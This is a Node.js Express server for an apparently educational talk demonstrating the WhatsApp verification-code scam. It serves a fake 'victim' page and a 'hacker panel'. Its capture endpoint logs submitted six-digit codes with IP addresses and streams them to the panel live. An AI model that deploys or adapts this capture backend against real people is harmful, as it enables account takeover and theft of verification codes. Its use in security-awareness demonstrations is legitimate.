const express = require('express');
const cors = require('cors');
const path = require('path');
const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Armazenamento em memória (em produção use um banco de dados)
let capturedCodes = [];
let connectedHackers = [];

// Servir páginas estáticas
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Demo Educacional - Golpe WhatsApp</title>
            <style>
                body { 
                    font-family: Arial, sans-serif; 
                    max-width: 800px; 
                    margin: 0 auto; 
                    padding: 20px; 
                    background: #f5f5f5;
                }
                .container { 
                    background: white; 
                    padding: 30px; 
                    border-radius: 10px; 
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }
                h1 { color: #25D366; }
                .card { 
                    background: #e8f4fd; 
                    padding: 20px; 
                    margin: 15px 0; 
                    border-radius: 8px; 
                    border-left: 4px solid #25D366;
                }
                .btn { 
                    display: inline-block; 
                    background: #25D366; 
                    color: white; 
                    padding: 12px 24px; 
                    text-decoration: none; 
                    border-radius: 6px; 
                    margin: 5px; 
                    font-weight: bold;
                }
                .btn:hover { background: #128C7E; }
                .warning { 
                    background: #fff3cd; 
                    border: 1px solid #ffc107; 
                    color: #856404; 
                    padding: 15px; 
                    border-radius: 6px; 
                    margin: 20px 0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🚨 Demonstração Educacional - Golpe do WhatsApp</h1>
                
                <div class="warning">
                    <strong>⚠️ AVISO:</strong> Esta é uma ferramenta educacional para conscientização sobre segurança digital.
                </div>
                
                <div class="card">
                    <h2>📱 Página da Vítima</h2>
                    <p>Simula a página falsa onde as vítimas digitam o código</p>
                    <a href="/vitima" class="btn">Acessar Página da Vítima</a>
                </div>
                
                <div class="card">
                    <h2>🕵️ Painel do Hacker</h2>
                    <p>Mostra em tempo real os códigos capturados (para o palestrante)</p>
                    <a href="/hacker" class="btn">Acessar Painel do Hacker</a>
                </div>
                
                <div class="card">
                    <h3>🎯 Como usar na palestra:</h3>
                    <ol>
                        <li>Abra o <strong>Painel do Hacker</strong> no projetor</li>
                        <li>Envie o link da <strong>Página da Vítima</strong> para a plateia</li>
                        <li>Peça para digitarem códigos de 6 dígitos</li>
                        <li>Mostre em tempo real no painel</li>
                    </ol>
                </div>
                
                <p><strong>👨‍💻 Desenvolvido por:</strong> Ederson Heleno de Souza</p>
            </div>
        </body>
        </html>
    `);
});

app.get('/vitima', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'vitima.html'));
});

app.get('/hacker', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'hacker-panel.html'));
});

// API para receber códigos das vítimas
app.post('/api/capture', (req, res) => {
    const victimData = {
        ...req.body,
        id: Date.now(),
        ip: req.ip || req.connection.remoteAddress,
        status: 'CAPTURADO',
        timestamp: new Date().toLocaleString('pt-BR')
    };

    console.log('🎯 Código capturado:', victimData.code);
    
    capturedCodes.push(victimData);
    
    // Notificar hackers conectados via SSE
    notifyHackers(victimData);
    
    res.json({ 
        status: 'success', 
        message: 'Código recebido pelo hacker',
        demo: 'Esta é uma demonstração educacional' 
    });
});

// API para hackers obterem os códigos
app.get('/api/codes', (req, res) => {
    res.json({
        total: capturedCodes.length,
        codes: capturedCodes,
        serverTime: new Date().toLocaleString('pt-BR')
    });
});

// Server-Sent Events para atualização em tempo real
app.get('/api/stream', (req, res) => {
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'Access-Control-Allow-Origin': '*'
    });

    const hackerId = Date.now();
    connectedHackers.push({ id: hackerId, res });

    req.on('close', () => {
        connectedHackers = connectedHackers.filter(h => h.id !== hackerId);
    });
});

function notifyHackers(victimData) {
    connectedHackers.forEach(hacker => {
        hacker.res.write(`data: ${JSON.stringify(victimData)}\n\n`);
    });
}

// Health check para Render
app.get('/health', (req, res) => {
    res.json({ 
        status: 'online', 
        capturas: capturedCodes.length,
        hackers_ativos: connectedHackers.length 
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
    console.log(`📱 Página da Vítima: http://localhost:${PORT}/vitima`);
    console.log(`🕵️ Painel do Hacker: http://localhost:${PORT}/hacker`);
});